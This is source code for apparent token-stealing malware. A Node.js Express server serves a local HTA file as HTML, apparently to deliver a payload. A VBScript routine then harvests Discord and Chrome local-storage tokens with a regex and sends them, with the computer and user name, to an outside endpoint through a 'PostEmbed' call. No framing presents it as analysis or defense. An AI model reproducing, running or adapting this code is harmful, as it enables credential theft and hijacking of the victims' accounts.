const express = require('express');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    try {
        const htaContent = fs.readFileSync('./file.hta', 'utf8');
        res.setHeader('Content-Type', 'text/html');
        res.send(htaContent);
    } catch (err) {
        res.send('Error loading HTA file. Make sure file.hta exists.');
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
Sub GrabDiscordTokens()
    Dim paths(1)
    paths(0) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Discord\Local Storage\leveldb"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
    Dim tokens: tokens = ""
    Dim folder, file, fso, content, regex, matches
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set regex = New RegExp
    regex.Pattern = """([^""]*token[^""]*)""\s*:\s*""([^""]+)"""
    regex.Global = True
    For Each folderPath In paths
        If fso.FolderExists(folderPath) Then
            Set folder = fso.GetFolder(folderPath)
            For Each file In folder.Files
                If InStr(file.Name, ".ldb") > 0 Or InStr(file.Name, ".log") > 0 Then
                    content = ReadFile(file.Path)
                    Set matches = regex.Execute(content)
                    For Each match In matches
                        If InStr(match.SubMatches(0), "token") > 0 Then
                            tokens = tokens & match.SubMatches(1) & vbLf
                        End If
                    Next
                End If
            Next
        End If
    Next
    If Len(tokens) > 0 Then
        Call PostEmbed("Discord Tokens", "Tokens:" & vbLf & tokens & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16753920)
    End If
End Sub
